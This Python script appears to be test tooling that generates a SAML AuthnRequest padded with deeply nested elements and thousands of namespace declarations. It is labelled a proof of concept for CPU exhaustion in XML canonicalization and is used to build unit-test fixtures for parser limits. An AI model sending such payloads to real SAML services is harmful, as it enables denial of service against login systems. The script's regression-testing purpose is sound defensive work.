#!/usr/bin/env python3

# Modeled on POC code supplied by reporters of OSJ-442 in reproducibility.zip
# Unit test targets produced with
#   --depth 1 --ns-per-level 50 --outputFile AuthnRequest_elementAttributeLimit.xml
#   --depth 50 --ns-per-level 5 --outputFile AuthnRequest_maxElementDepth.xml


import argparse, time, uuid
from urllib.parse import urlencode

# Short namespace prefixes: base-26 first char (a-z), base-36 rest (a-z, 0-9).
# ~2x more namespaces per byte vs "ns0x1234" style names.
FIRST = "abcdefghijklmnopqrstuvwxyz"
REST = "0123456789abcdefghijklmnopqrstuvwxyz"

def gen_prefix(n, width):
    """Convert integer to a valid XML namespace prefix of fixed width."""
    tail = []
    for _ in range(width - 1):
        tail.append(REST[n % 36])
        n //= 36
    return FIRST[n % 26] + "".join(reversed(tail))

def gen_prefixes(count):
    """Generate `count` unique short namespace prefixes."""
    width = 2 if count <= 936 else 3  # 26*36=936, 26*36*36=33696
    return [gen_prefix(i, width) for i in range(count)]

parser = argparse.ArgumentParser(description="SAML C14N CPU exhaustion PoC")
parser.add_argument("--depth", type=int, default=7)
parser.add_argument("--ns-per-level", type=int, default=10000)
parser.add_argument("--outputFile", required=True)
args = parser.parse_args()

req_id = f"_id-{uuid.uuid4()}"
instant = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

# Generate short namespace prefixes
prefixes = gen_prefixes(args.ns_per_level)

# Build deeply nested XML inside <samlp:Extensions>
inner = ""
for d in range(args.depth):
    ns_attrs = " ".join(f'xmlns:{p}="u:{d}:{i}"' for i, p in enumerate(prefixes))
    inner += f"<{prefixes[0]}:e {ns_attrs}>"
inner += "X"
for d in range(args.depth - 1, -1, -1):
    inner += f"</{prefixes[0]}:e>"

saml_request = f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                    ID="{req_id}" Version="2.0" IssueInstant="{instant}"
                    Destination="https://www.example.edu/saml/receiver"
                    ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST">
  <saml:Issuer>https://attacker.example.com</saml:Issuer>
  <samlp:Extensions>
    {inner}
  </samlp:Extensions>
</samlp:AuthnRequest>"""

with open(args.outputFile, "w") as file:
    file.write(saml_request)
